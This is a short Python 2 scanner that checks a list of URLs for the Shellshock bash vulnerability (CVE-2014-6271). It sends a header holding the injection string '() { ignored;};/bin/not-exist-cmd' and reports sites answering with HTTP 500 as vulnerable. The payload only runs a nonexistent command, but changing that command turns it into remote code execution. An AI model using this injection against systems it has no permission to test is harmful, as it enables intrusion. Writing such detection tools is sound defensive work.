#!/usr/bin/python
#CVE-2014-6271 based on 500 Error test
#Input file must be a list of URLs to test. 
#psc4re

import httplib,urllib,sys
from urlparse import urlparse

j = open("report", "w")

if (len(sys.argv)<2):
	print "Usage: %s file" % sys.argv[0]
	print "Example: %s input.txt" % sys.argv[0]
	exit(0)
with open(sys.argv[1]) as f:
	for line in f:
		url = line.strip("\n")
		parse_object = urlparse(url)
		domain = parse_object.netloc
		cgi = parse_object.path
		proto = parse_object.scheme

		if proto == "https":
			conn = httplib.HTTPSConnection(domain)
		elif proto == "http":
			conn = httplib.HTTPConnection(domain)
		else:
			exit(0)

		cmd="() { ignored;};/bin/not-exist-cmd"

		headers = {"Content-type": "application/x-www-form-urlencoded", "test":cmd }
		conn.request("GET",cgi,headers=headers)
		res = conn.getresponse()

		if res.status == 500:
			print "site: "+url+ " is vulnerable"
			j.write("site: "+url+ " is vulnerable \n")
		else:
			print "site: "+url+" is likely good"
			j.write("site: "+url+" is likely good \n")

